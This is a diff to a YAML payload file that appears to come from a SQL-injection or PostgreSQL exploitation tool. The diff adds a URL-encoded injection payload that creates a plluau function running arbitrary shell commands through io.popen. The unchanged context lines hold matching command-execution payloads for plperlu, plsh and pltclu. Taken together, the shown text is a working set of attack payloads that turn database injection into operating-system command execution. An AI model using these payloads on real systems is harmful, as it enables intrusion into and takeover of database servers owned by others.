@@ -165,6 +165,15 @@ resource:
         return c(cmd.split('%%20')).decode()%%0a
       $$%%20language %s
     
+    # extension name pllua but language name plluau
+    pllua: |
+      ; create function exec_cmd(cmd text) returns text language plluau as%20$$%0a
+        local handle = io.popen(cmd)%0a
+        local result = handle:read("*a")%0a
+        handle:close()%0a
+        return result%0a
+      $$
+
     plperl: ; create or replace function exec_cmd(text) returns text as 'return `$_[0]`' language plperlu
     plsh: ; create or replace function exec_cmd(text) returns text as '%23!/bin/sh%0a$1' language plsh
     pltcl: ; create or replace function exec_cmd(text) returns text as 'eval exec%20"$1"' language pltclu
